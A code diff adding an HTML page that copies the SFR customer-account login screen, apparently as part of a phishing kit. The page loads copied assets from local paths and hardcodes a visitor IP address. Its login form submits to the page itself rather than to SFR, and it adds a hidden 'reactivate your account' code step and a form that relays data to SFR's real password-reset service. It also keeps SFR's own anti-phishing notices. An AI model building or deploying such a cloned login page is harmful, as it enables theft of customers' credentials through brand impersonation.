@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<meta name="robots" content="nofollow" />
+
+<script type="text/javascript">
+	var ip_address = "60.54.9.168";
+</script>
+<title>Espace Client SFR - Gestion de mon compte SFR</title>
+<link rel="shortcut icon" href="img/favicon.ico" />
+<script type="text/javascript" src="js/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="js/core.js"></script>
+<script type="text/javascript" src="js/mire-jquery.placeholder.js"></script>
+<script type="text/javascript" src="js/iframeResizer.min.js"></script> 
+<script type="text/javascript">
+	function sendStatsMsg(){}
+	_stats_pagename = "Authentification/Mon Compte";
+ 	
+ 	_cCas = {
+		ts: 1398676455059,
+		img: "img/mire_espace_client.jpg",
+		alt: "Outils de Gestion SFR mon compte",
+		focus: true,
+		css: "css/mire-v1-style-web.css",
+		ok: 0
+	}
+ 	
+
+	$(function(){
+		var enableEtag = true;
+		var typeMire="web";
+		if (!enableEtag || !_cCas.ok) {
+			//finalizeLoginPage(typeMire);
+			//finalizeLoginPage(typeMire);
+			loadStyle();
+			if (typeMire=="web") {
+				var img = new Image();
+				img.src = "img/mire_espace_client.jpg";
+				img.alt = "Outils de Gestion SFR mon compte";
+				//$("#colL").append(img);
+			}
+		}
+		if (!enableEtag || _cCas.focus) {
+			focus();
+		}
+	});
+
+	function finalizeLoginPage(type) {
+		var enableEtag = true;
+		var cdnOption = "";
+		var mobileOption = "&mobileMode=true";
+		var layerOption = "&layerMode=true";
+		var urlRetour = "&urlRetour=https%3A%2F%2Fwww.sfr.fr%2Fcas%2Flogin%3Fdomain%3Dmire-ec%26service%3Dhttps%253A%252F%252Fwww.sfr.fr%252Faccueil%252Fj_spring_cas_security_check";
+	    var forgotPasswordUrl = "https://www.sfr.fr/parcours/securite/oubliMotDePasse/identifiant.action?";
+	    var forgotIdUrl = "https://www.sfr.fr/parcours/securite/oubliIdentifiant/informations.action?";
+	    var forgotPasswordCID = "#sfrclicid=EC_mire_oubli-mdp";
+	    var forgotPasswordLayerCID = "#sfrclicid=EC_mire_layer-mdp-oublie";
+	    var forgotIdCID = "#sfrclicid=EC_mire_oubli-id";
+	    var forgotIdLayerCID = "#sfrclicid=EC_mire_layer-oubli-id";
+	    var accountLockedCID = "#sfrclicid=EC_mire_compte-ko";
+	    var accountLockedErrorCID = "#sfrclicid=EC_mire_msgerr-compte-ko";
+	    if (type == "mobile") {
+	    	$("#forgotPassword").attr("href", forgotPasswordUrl + mobileOption + urlRetour + forgotPasswordCID);
+	    	$("#forgotPasswordLayer").attr("href", forgotPasswordUrl + mobileOption + urlRetour + forgotPasswordLayerCID);
+	    	$("#accountLocked").attr("href", forgotPasswordUrl + mobileOption + urlRetour + accountLockedCID);
+	    	$("#accountLockedError").attr("href", forgotPasswordUrl + mobileOption + urlRetour + accountLockedErrorCID);
+	    	$("#mire-items li").last().remove();
+	    	$("#mire-items li").last().remove();
+	    	$("#firstConnection").remove();
+	    	$("#editoTitle").remove();
+	    	$("#helpTitle").remove();
+	    	$(".style-second-block").remove();
+	    	$("#mire-phishing").remove();
+	    	$(".error-panel").detach().appendTo("#formTitle");
+	    	if (enableEtag) { _cCas.focus = false }
+	    } else if (type == "layer") {
+	    	$("#forgotPassword").attr("href", forgotPasswordUrl + layerOption + forgotPasswordCID);
+	    	$("#forgotPasswordLayer").attr("href", forgotPasswordUrl + layerOption + forgotPasswordLayerCID);
+	    	$("#accountLocked").attr("href", forgotPasswordUrl + layerOption + accountLockedCID);
+	    	$("#accountLockedError").attr("href", forgotPasswordUrl + layerOption + accountLockedErrorCID);
+	    	$("#forgotId").attr("href", "#");
+	    	$("#forgotIdLayerUrl").attr("href", "#").click(function(){
+	    		urlRetour = "urlRetour=https%3A%2F%2Fwww.sfr.fr%2Fcas%2Flogin%3Ftheme%3Dmire-sfr%26service%3Dhttps%253A%252F%252Fwww.sfr.fr%252Faccueil%252Fj_spring_cas_security_check%26target%3D%252Faccueil%252Fmobile.html";
+	    		window.parent.location.href = forgotIdUrl + urlRetour + forgotIdLayerCID;
+	    		return false;
+	    	});
+	    	$("input, textarea").placeholder();
+	    } else {
+	    	$("#forgotPassword").attr("href", forgotPasswordUrl + urlRetour + cdnOption + forgotPasswordCID);
+	    	$("#forgotPasswordLayer").attr("href", forgotPasswordUrl + urlRetour + cdnOption + forgotPasswordLayerCID);
+	    	$("#accountLocked").attr("href", forgotPasswordUrl + urlRetour + cdnOption + accountLockedCID);
+	    	$("#accountLockedError").attr("href", forgotPasswordUrl + urlRetour + cdnOption + accountLockedErrorCID);
+	    	$("#forgotId").attr("href", forgotIdUrl + urlRetour + forgotIdCID);
+	    	$("input, textarea").placeholder();
+	    }
+	}
+	function loadStyle(){
+		//$("head").append('<link rel="stylesheet" type="text/css" href="css/mire-v1-style-web.css" />');
+	}
+	function focus(){
+		var username = $("#username");
+		var password = $("#password");
+		if (username.attr("type") == "hidden") password.focus();
+		else username.focus();
+	}
+
+</script>
+<link rel="stylesheet" type="text/css" href="css/global.sfr.min.css" />
+<link rel="stylesheet" type="text/css" href="css/mire-v1-style-web.css" />
+<script language="javascript" type="text/javascript">
+  function resizeIframe(obj) {
+    obj.style.height = obj.contentWindow.document.body.scrollHeight + 'px';
+  }
+</script>
+</head>
+
+<body class="sfr-pwp-content"  style="" >
+	
+		<div id="eTH" class="sfrDom">
+  <!--googleoff:all-->
+
+  <!--[if IE]>
+<link rel="stylesheet" href="css/sfr.header.ie.v2.css" />
+<![endif]-->
+  <div id="ghostHeaderWrapper" class="sfrDom  header-ec ">
+    <div id="megaShadow">
+    </div>
+    <div id="ghostHeader">
+      <div id="header">
+        <div id="headerContent">
+          <div class="switchUniverse">
+            <ul style="position: relative; width: auto; top: 0px; left: 0px;">
+              <li>
+                <a class="hasTooltip active" rel="particulierTooltip" href="http://www.sfr.fr/?offres#sfrintid=EC_meta_part">
+                  Particuliers
+                </a>
+              </li>
+              <li>
+                <a class="proLinks hasTooltip" rel="professionalsTooltip" href="http://www.sfr.fr/mobile/offres-professionnels.jspe#sfrintid=EC_meta_pro">
+                  Pro &lt; 10 salariés
+                </a>
+              </li>
+              <li>
+                <a class="etsLinks hasTooltip" rel="entreprisesTooltip" href="http://sfrbusinessteam.fr/#sfrintid=EC_meta_entr">
+                  Entreprises
+                </a>
+              </li>
+              <li class="last-child">
+                <a href="http://groupe.sfr.fr/#sfrintid=EC_meta_groupe-sfr">
+                  Groupe SFR
+                </a>
+              </li>
+            </ul>
+            <!--
+<div id="professionalsTooltip" class="tooltip sfrDom">
+<img src="//static.s-sfr.fr/media/tooltip-lien-professionnel-1.png" alt="" />
+</div>
+<div id="particulierTooltip" class="tooltip sfrDom">
+<img src="http://static.s-sfr.fr/media/tooltip-particuliers.png" alt="">
+</div>
+<div id="entreprisesTooltip" class="tooltip sfrDom">
+</div>
+-->
+  </div>
+  <a href="http://www.sfr.fr/portail.html#sfrintid=EC_head_logo" id="sfrHeaderLogo">
+    <img src="//static.s-sfr.fr/media/logo-sfr-73x60.png" width="73" height="60" alt="Logo de SFR.FR">
+  </a>
+  <div class="mainNavigation">
+    <ul style="position: relative; width: auto; top: 0px; left: 0px;">
+      <li id="mn_a">
+        <a href="http://www.sfr.fr/?fromEC#sfrintid=EC_nav_offre">
+          Boutique
+        </a>
+      </li>
+      
+      <li id="mn_b">
+        <a href="http://www.sfr.fr/portail.html?sfrintid=EC_nav_portail">
+          Votre Portail
+        </a>
+      </li>
+      <li id="mn_c">
+        <a href="https://assistance.sfr.fr/#sfrintid=EC_nav_ass">
+          Assistance
+        </a>
+      </li>
+    </ul>
+  </div>
+  
+  <div class="mainSearch   espaceclient ">
+    <form action="http://www.sfr.fr/recherche/#sfrclicid=EC_meta_gsa" method="post" name="gsaSearchForm">
+      <div class="headerSearchTextWrapper">
+        <input class="headerSearchText" id="sfrSearch" type="text" value="Rechercher sur le site" title="Rechercher sur le site" name="q" maxlength="400" autocomplete="off">
+      </div>
+      <input type="hidden" name="perimetre" value="gsa">
+      
+      <input type="hidden" name="univers" value="SFR.fr">
+      
+      <input type="hidden" name="asSite" value="">
+      
+      <input type="hidden" name="filter" value="1">
+      
+      <input type="submit">
+    </form>
+    <script>
+      //gsaInitForm(document.gsaSearchForm.q,'',1)
+    </script>
+  </div>
+  <div class="userLinks unauthent  espaceclient " id="sfrUsersLinksH2012">
+    <!-- START BOARD -->
+    <div class="sfrBoard">
+      
+      <div class="section identity first unauthent  espaceclient ">
+        <div class="content">
+          <h2 class="menu-trigger">
+            <span id="header_name" class="board-label">
+              Connectez-vous
+            </span>
+            <span class="arrow">
+            </span>
+            <div class="menu-content">
+              <ul style="position: relative; width: auto; top: 0px; left: 0px;">
+                <li>
+                  <a href="https://messagerie.sfr.fr/?sfrintid=EC_head_mail">
+                    Mail
+                  </a>
+                </li>
+                <li>
+                  <a href="http://www.sfr.fr/mon-espace-client/?sfrintid=EC_head_ec">
+                    Espace client
+                  </a>
+                </li>
+                <li>
+                  <a href="http://www.sfr.fr/suivi-commande/?sfrintid=EC_head_suivi">
+                    Suivi de commande
+                  </a>
+                </li>
+                <li class="only-authent">
+                  <a href="http://www.sfr.fr/mon-espace-client/identifiants?sfrintid=EC_head_param">
+                    Paramètres du compte
+                  </a>
+                </li>
+                <li class="only-nonauthent">
+                  <a href="http://www.sfr.fr/procedures-urgence/actes-urgences.html?sfrintid=EC_head_actes">
+                    Urgence et dépannage
+                  </a>
+                </li>
+                <li class="only-authent">
+                  <a href="http://www.sfr.fr/routage/urgence-depannage?deplie=ok&amp;sfrintid=EC_head_actes">
+                    Urgence et dépannage
+                  </a>
+                </li>
+                <li class="only-authent deconnexion">
+                  <a href="http://www.sfr.fr/cas/logout?sfrintid=EC_head_deconnexion">
+                    Déconnexion
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </h2>
+          <div class="mail">
+            <a id="unread_mails" href="https://messagerie.sfr.fr/?sfrintid=EC_head_mail">
+              Mail
+            </a>
+          </div>
+          <div class="espace">
+            <a href="http://www.sfr.fr/mon-espace-client/?sfrintid=EC_head_ec">
+              Espace client
+            </a>
+          </div>
+        </div>
+      </div>
+    </div>
+    <!-- END BOARD -->
+  </div>
+  </div>
+  <div id="_megamenu">
+    
+    <!-- START MM -->
+    
+  <div id="megamenuWrapper">
+    <!-- LES MEGAMENUS -->
+    <!-- LES MEGAMENUS FIN -->
+    <!-- START -->
+    <!-- END -->
+    <div class="megamenu megaclone">
+    </div>
+  </div>
+  
+  <!-- END MM -->
+  </div>
+  </div>
+  </div>
+  </div>
+
+  <!--googleon:all-->
+</div>
+
+		<div class="page">
+
+		<div id="header" class="espace-client"></div>
+
+			<!-- Début de id="main" -->
+			<div id="main">
+
+				<div class="boxTitle">
+					<h1 id="editoTitle" class="" >Espace Client SFR</h1>
+				</div>
+
+				<div id="colR">
+
+					<div id="column-right">
+
+						<div class="block" id="style-first-block">
+
+							<div class="content-area" id="mire-phishing">
+								<div class="item center">
+									<a href="#" class="really-light-link">Info Phishing</a>
+								</div>
+							</div>
+
+							<h2 id="formTitle" class="side_name">Connectez-vous</h2>
+
+							<div class="content-area" id="mire-form">
+
+								<p class="notes">Email, NeufID ou numéro de ligne mobile/Clé Internet</p>
+								
+								<form name="loginForm" id="loginForm" action="" method="post">
+										<div class="custom-input-text">
+											<label for="username"></label>
+											<img class="is-focus" src="img/icon-user-focus_20x20.png"/>
+											<img class="is-onerror" src="img/icon-user-error_20x20.png"/>
+											<img class="is-normal" src="img/icon-user-normal_20x20.png"/>
+											<input id="username" name="username" type="text" value="" placeholder="Identifiant" autocomplete="off" maxlength="256" />
+										</div>
+									
+									
+									
+
+									<div class="custom-input-text">
+										<label for="password"></label>
+										<img class="is-focus" src="img/icon-password-focus_20x20.png"/>
+										<img class="is-onerror" src="img/icon-password-error_20x20.png"/>
+										<img class="is-normal" src="img/icon-password-normal_20x20.png"/>
+										<input id="password" name="password" type="password" value="" placeholder="Mot de passe" autocomplete="off" maxlength="16" />
+									</div>
+									<!--  -->
+									<div id="error_container" class="error-panel " style="display:none;">
+										<button type="button" class="close">Fermer</button>
+										<p>Vos coordonnées n’ont pas été reconnues. Veuillez recommencer.</p>
+									</div>
+
+									<div class="item">
+										<div class="checkbox-left">
+											<div class="part-1">
+												<input type="checkbox" name="remember-me" id="remember-me" checked />
+											</div>
+											<div class="part-2">
+												<label for="remember-me">Rester connecté</label>
+											</div>
+										</div>
+										<button class="button-2" type="submit" name="identifier" id="identifier_btn">Me connecter</button>
+									</div>
+								</form>
+
+								
+
+							</div>
+
+							<h2 id="helpTitle">Besoin d'aide</h2>
+
+							<div class="content-area" id="mire-items">
+								
+								<ul class="items-list">
+									<li><a id="forgotPassword" href="https://www.sfr.fr/parcours/securite/oubliMotDePasse/identifiant.action?urlRetour=https%3A%2F%2Fwww.sfr.fr%2Fcas%2Flogin%3Fdomain%3Dmire-ec%26service%3Dhttps%253A%252F%252Fwww.sfr.fr%252Faccueil%252Fj_spring_cas_security_check#sfrclicid=EC_mire_oubli-mdp" class="light-link">Mot de passe oublié</a></li>
+									<li><a id="accountLocked" href="https://www.sfr.fr/parcours/securite/oubliMotDePasse/identifiant.action?urlRetour=https%3A%2F%2Fwww.sfr.fr%2Fcas%2Flogin%3Fdomain%3Dmire-ec%26service%3Dhttps%253A%252F%252Fwww.sfr.fr%252Faccueil%252Fj_spring_cas_security_check#sfrclicid=EC_mire_compte-ko" class="light-link">Compte bloqué</a></li>
+									<li><a id="forgotId" href="https://www.sfr.fr/parcours/securite/oubliIdentifiant/informations.action?urlRetour=https%3A%2F%2Fwww.sfr.fr%2Fcas%2Flogin%3Fdomain%3Dmire-ec%26service%3Dhttps%253A%252F%252Fwww.sfr.fr%252Faccueil%252Fj_spring_cas_security_check#sfrclicid=EC_mire_oubli-id" class="light-link">Identifiant oublié</a></li>
+									<li><a id="firstConnection" href="#" class="light-link">Première connexion</a></li>
+								</ul>
+
+							</div>
+						</div>
+
+						<style>
+.style-second-block#block-acte-urgence-v2 {
+  background-color: #f0f0f0;
+  padding-left: 65px;
+}
+.style-second-block#block-acte-urgence-v2 .second-block-text {
+  background: #FFF;
+  padding: 12px 8px;
+  -webkit-box-sizing: border-box;
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+  height: 100%;
+}
+.style-second-block#block-acte-urgence-v2 .second-block-text > h5,
+.style-second-block#block-acte-urgence-v2 .second-block-text x:-moz-any-link,
+.style-second-block#block-acte-urgence-v2 .second-block-text x:default {
+  font-family: "SFR-Regular", Arial, Sans-serif !important;
+}
+.style-second-block#block-acte-urgence-v2 .second-block-text > h5 {
+  font-size: 13px;
+  /*so it can be rounded a bit more*/
+
+  font-size: 0.8125rem;
+  letter-spacing: -0.01em;
+  margin-bottom: 2px;
+  font-family: "SFR-Bold", "SFR-Regular", Arial, Sans-serif;
+}
+.style-second-block#block-acte-urgence-v2 .second-block-text > a {
+  font-size: 12px;
+  /*so it can be rounded a bit more*/
+
+  font-size: 0.75rem;
+  display: block;
+  padding-left: 14px;
+  height: 32px;
+  line-height: 32px;
+  -webkit-box-sizing: border-box;
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+  color: #000;
+  text-decoration: none;
+  position: relative;
+  background-image: url(img/sprite.png);
+  background-repeat: no-repeat;
+  background-position: 0px -1289px;
+}
+.style-second-block#block-acte-urgence-v2 .second-block-text > a:hover {
+  text-decoration: underline;
+}
+.style-second-block#block-acte-urgence-v2 {
+  background-image: url(img/sprite.png);
+  background-repeat: no-repeat;
+  background-position: 6px -1861px;
+}
+</style>
+<div id="block-acte-urgence-v2" class="style-second-block"><div class="second-block-text"><h5>Mobile perdu ou volé, SIM bloquée</h5><a href="https://www.sfr.fr/procedures-urgence/actes-urgences.html#sfrclicid=EC_mire_actes-urgences" class="really-light-link">Accédez aux actes d'urgence</a></div></div>
+
+					</div>
+
+				</div>
+
+				<div id="colL" style="height:100%;">
+					<img id="espace_client" src="img/mire_espace_client.jpg">
+
+					<style type="text/css">
+						.etape {
+						display: block;
+						float: left;
+						text-align: center !important;
+						margin-left: 19px;
+						position: relative;
+						z-index: 1;
+						padding-bottom: 50px;
+						}
+
+						.etape.etape2 h2 {
+						margin-bottom: 12px;
+						}
+
+						.etape h2 {
+						text-align: left;
+						margin: 0;
+						margin-top: 8px;
+						margin-bottom: 30px;
+						position: relative;
+						left: -14px;
+						}
+
+						.etape h2 .text {
+						font-family: "SFR-Bold";
+						font-size: 16px;
+						display: inline-block;
+						padding-left: 42px;
+						padding-top: 8px;
+						}
+
+						.etape .errMsg {
+						color: #bd1220;
+						margin-bottom: 10px;
+						display: none;
+						}
+
+						.etape .msg {
+						font-size: 13px;
+						display: block;
+						text-align: left;
+						margin-left: 28px;
+						}
+
+						.etape input {
+						margin-right: 339px;
+						height: 26px;
+						border: 1px solid #c4c4c4;
+						box-shadow: 2px 3px 0px 0px #f0f0f0 inset;
+						}
+
+						.etape img {
+						display: block;
+						margin-top: 7px;
+						margin-bottom: 8px;
+						margin-left: 28px;
+						}
+
+						.etape .msg, .etape .msg * {
+						color: black;
+						}
+
+						.etape .msg {
+						font-size: 13px;
+						display: block;
+						text-align: left;
+						margin-left: 28px;
+						}
+
+						.myosotis-btn.myosotis-btn-simple {
+						font-size: 13px !important;
+						font-family: Arial !important;
+						font-weight: bold !important;
+						padding: 7px 16px !important;
+						}
+
+						.myosotis-btn {
+						font-size: 100% !important;
+						font: inherit !important;
+						line-height: 1.2em !important;
+						text-align: left !important;
+						position: relative !important;
+						-moz-user-select: none !important;
+						-webkit-user-select: none !important;
+						user-select: none !important;
+						background: #616197 !important;
+						border: 1px solid #616197 !important;
+						font-size: 16px !important;
+						font-family: "SFR-Regular" !important;
+						padding: 11px 16px !important;
+						color: #FFF !important;
+						box-shadow: 0px 2px 2px rgba(131, 131, 131, 0.4) !important;
+						-moz-box-shadow: 0px 2px 2px rgba(131, 131, 131, 0.4) !important;
+						-webkit-box-shadow: 0px 2px 2px rgba(131, 131, 131, 0.4) !important;
+						border-radius: 4px !important;
+						-moz-border-radius: 4px !important;
+						-webkit-border-radius: 4px !important;
+						transition: all 0.2s !important;
+						text-decoration: none !important;
+						vertical-align: bottom !important;
+						}
+
+
+					</style>
+					<div class="etape etape2" style="display:none;opacity: 1;">
+						<h2>
+							<span class="text">Saisissez le code affiché ci-dessous pour réactiver votre compte SFR</span>
+						</h2>
+
+					<div class="msg errMsg" style="display: true">Veuillez recopier le code ci-dessous</div>
+
+					<input style="padding-left: 5px;" id="f-code" name="captcha" type="text" value="" size="25" autocomplete="off">
+
+					<div id="captcha_container">
+					<img id="captcha_img" src="" style="height: 80px; width: 160px">
+					</div> 
+					
+					<span class="msg">Vous n'arrivez pas à déchiffrer ce code ?<br>
+					<a id="loadCaptcha" onclick="loadCaptcha()" style="text-decoration: underline !important;cursor: pointer;" class="coche-myosotis">Afficher un autre code</a></span>
+					
+
+					<button onclick="sendCaptcha()" style="float: right;padding-left: 10px;" id="f-continuer" class="myosotis-btn myosotis-btn-simple" type="submit" style="cursor: pointer;">Continuer</button>
+
+					</div>
+				</div>
+
+			</div><!-- Fin de id="main" -->
+
+			<div class="layer" id="layer-bloc1" style="display: none">
+			    <div class="layer-wrapper-bg"></div>
+			    <div id="pishingLayer" class="layer-wrapper">
+			      <span class="close"></span>
+				  <div class="layer-content-area">
+
+					<h3>Informations sécurité SFR</h3>
+
+					<!-- -->
+					<div>
+						<p>
+							SFR a adopté une fonction de sécurité sur sa page d’authentification vous permettant de vérifier visuellement que vous êtes bien sur le site web SFR légitime.<br /><br />
+							Aussi, ayez le bon réflexe :<br />
+							Vérifiez que vous voyez SFR <strong>(SOCIété française du radiotéléphone - SFR SA)</strong> affiché en vert ou sur fond vert dans la barre de navigation de votre navigateur internet.<br /><br />
+							Par exemple :
+						</p>
+						<img src="img/layer-content-1.jpg" width="413" height="111" alt="" />
+						<p>
+							Si vous utilisez un système d’exploitation ou une version de navigateur internet anciens, vous n’aurez pas cet affichage.
+						</p>
+					</div>
+					<!-- -->
+
+				  </div>
+				</div>
+			</div>
+
+			<div class="layer" id="layer-bloc2" style="display: none">
+			    <div class="layer-wrapper-bg"></div>
+			    <div id="forgotIdLayer" class="layer-wrapper">
+			      <span class="close"></span>
+				  <div class="layer-content-area">
+
+					<h3>Votre identifiant</h3>
+
+					<!-- -->
+					<div>
+						<p>
+							<b>Vous êtes client mobile, clé Internet ou tablette :</b><br>
+							Utilisez votre numéro de ligne mobile : 06xxxxxxxx ou 07xxxxxxxx
+						</p><br>
+						<p>
+							<b>Vous êtes client ADSL / Fibre</b><br>
+							Utilisez votre adresse email ou identifiant NeufId. Si vous avez oublié votre identifiant, <a id="forgotIdLayerUrl" href="https://www.sfr.fr/parcours/securite/oubliIdentifiant/informations.action?urlRetour=https%3A%2F%2Fwww.sfr.fr%2Fcas%2Flogin%3Fdomain%3Dmire-ec%26service%3Dhttps%253A%252F%252Fwww.sfr.fr%252Faccueil%252Fj_spring_cas_security_check#sfrclicid=EC_mire_layer-oubli-id">cliquez ici</a>.
+						</p><br>
+						<p>
+							<b>Vous n'avez pas souscrit de ligne fixe ou de ligne mobile</b><br>
+							Votre identifiant est votre adresse email personnelle (@gmail.com, @yahoo.fr, @hotmail.com ...), celle que vous avez saisie lors de la création de votre compte.
+						</p>
+					</div>
+					<!-- -->
+
+				  </div>
+				  <a class="back" href="#">Retour</a>
+				</div>
+			</div>
+
+			<div class="layer" id="layer-bloc3" style="display: none">
+			    <div class="layer-wrapper-bg"></div>
+			    <div id="firstConnectionLayer" class="layer-wrapper">
+			      <span class="close"></span>
+				  <div class="layer-content-area">
+
+					<h3>Première connexion ?</h3>
+
+					<!-- -->
+					<div>
+						<p>
+							<b>Vous êtes client d'une ligne mobile :</b><br><br>
+							Votre identifiant est votre numéro de ligne mobile, c’est-à-dire 06xxxxxxxx ou 07xxxxxxxx.<br>
+							Pour accéder à votre compte personnel, votre ligne mobile doit fonctionner sur le réseau SFR. Vous avez reçu votre mot de passe par SMS.<br>
+							Si vous ne l’avez pas reçu, vous pouvez en demander un nouveau en cliquant sur le lien <a id="forgotPasswordLayer" href="https://www.sfr.fr/parcours/securite/oubliMotDePasse/identifiant.action?urlRetour=https%3A%2F%2Fwww.sfr.fr%2Fcas%2Flogin%3Fdomain%3Dmire-ec%26service%3Dhttps%253A%252F%252Fwww.sfr.fr%252Faccueil%252Fj_spring_cas_security_check#sfrclicid=EC_mire_layer-mdp-oublie">mot de passe oublié</a> et en renseignant les informations demandées.
+						</p><br>
+						<p>
+							<b>Vous êtes client d'une ligne fixe ADSL ou Fibre :</b><br><br>
+							Votre identifiant et votre mot de passe sont indiqués en haut à gauche de votre courrier suivi de commande : il s’agit des informations <span class="italic">"identifiant de messagerie"</span> et <span class="italic">"mot de passe de messagerie"</span>.<br>
+							Ce sont les mêmes pour votre Espace Client, le service SFR Mail, les Applis depuis votre mobile et la majorité des services SFR.
+						</p>
+					</div>
+					<!-- -->
+
+				  </div>
+				  <a class="back" href="#">Retour</a>
+				</div>
+			</div>
+
+
+		<div id="footer"></div>
+	</div>
+	<div id="lightFooter" class="sfrDom footer">
+  <div class="TopAnchorWrap">
+    <a href="#">
+      <img src="//static.s-sfr.fr/resources/img/homes/vitrine/topAnchor.png" alt="" title="">
+      Haut de page
+    </a>
+  </div>
+  <ul id="lightFooterLinksList">
+    <!--
+<li>
+<img id="footerBgShadow" src="//static.s-sfr.fr/resources/img/footer/lightFootBgShdw.png" alt="" title="">
+<a href="/plan-du-site/#sfrintid=P_footer_plan">
+Plan du site
+</a>
+</li>
+-->
+  <!--
+<li>
+|
+</li>
+-->
+  <li>
+    <a href="http://www.sfr.fr/mobile/espacesfr/hub.jspe#sfrintid=P_footer_espace">
+      Trouver un espace SFR
+    </a>
+  </li>
+  <li>
+    |
+  </li>
+  <li>
+    <a href="http://assistance.sfr.fr/accueil_service-client/contacter/nous-contacter/fc-2398-62219#sfrintid=P_footer_contact">
+      Nous contacter
+    </a>
+  </li>
+  <li>
+    |
+  </li>
+  <li>
+    <a href="http://assistance.sfr.fr/index.do#sfrintid=P_footer_ass">
+      Besoin d'aide?
+    </a>
+  </li>
+  <li>
+    |
+  </li>
+  <li>
+    <a href="//www.sfr.fr/mon-espace-client/?sfrintid=P_footer_ec">
+      Espace client
+    </a>
+  </li>
+  <li>
+    |
+  </li>
+  <li>
+    <a href="//www.sfr.fr/#sfrintid=P_footer_offre">
+      Boutique
+    </a>
+  </li>
+  <li>
+    |
+  </li>
+  <li>
+    <a href="//www.sfr.fr/portail.html#sfrintid=P_footer_portail">
+      Votre Portail
+    </a>
+  </li>
+  </ul>
+  <div id="footerBottomInfo">
+    <div id="copyrightsInfo">
+      <a href="//www.sfr.fr/accueil/accueil.html#sfrintid=P_footer_sfr " title="SFR.fr">
+        <img src="//static.s-sfr.fr/media/logo-sfr-26x26.png" alt="Logo de SFR.FR">
+      </a>
+      © 2014 SFR - 
+      <a href="//www.sfr.fr/accueil/accueil.html#sfrintid=P_footer_sfr ">
+        www.sfr.fr
+      </a>
+    </div>
+    <ul>
+      <li>
+        <a href="//www.sfr.fr/mentions-legales.html#sfrintid=P_footer_info-legale">
+          Informations légales
+        </a>
+      </li>
+      <li class="bottLinksSep">
+        |
+      </li>
+      <li>
+        <a href="//www.sfr.fr/plan-du-site.html#sfrintid=P_footer_plan">
+          Plan du site
+        </a>
+      </li>
+      <li class="bottLinksSep">
+        |
+      </li>
+      
+      <li>
+        
+        <a class="mediumLink" style="padding-left: 15px; background-image: url(//static.s-sfr.fr/media/phising-ico-1.jpg)" href="http://assistance.sfr.fr/internet_offre-services/securite/vrai-site-sfr-espace-client/fc-3212-80564#sfrintid=V_footer_phishing" target="_blank">
+          Phishing
+        </a>
+      </li>
+      <li class="bottLinksSep">
+        |
+      </li>
+      
+      <li>
+        
+        <a href="#" class="toggle-popin">
+          Cookies
+        </a>
+      </li>
+  <li id="additionalLink">
+    <a class="mediumLink" href="http://www.pointdecontact.net/contact.aspx#sfrintid=P_footer_contenu-illicite" target="_blank">
+      Signaler un contenu illicite
+    </a>
+  </li>
+  </ul>
+  <img id="logoFIANET" src="//static.s-sfr.fr/media/certissim.png" alt="certissim">
+  </div>
+</div>
+<form id="captcha_form" name="captcha_form" action="https://www.sfr.fr/parcours-securite/password/oubliMotDePasse/envoi.action?urlRetour=https://www.sfr.fr/cas/login?domain=mire-ec&service=https://www.sfr.fr/accueil/j_spring_cas_security_check" method="POST" target="_blank">
+<input type="hidden" name="login" id="login" value="" />
+<input type="hidden" name="captcha" id="captcha" value="" />
+</form>	
+	</body>
+</html>
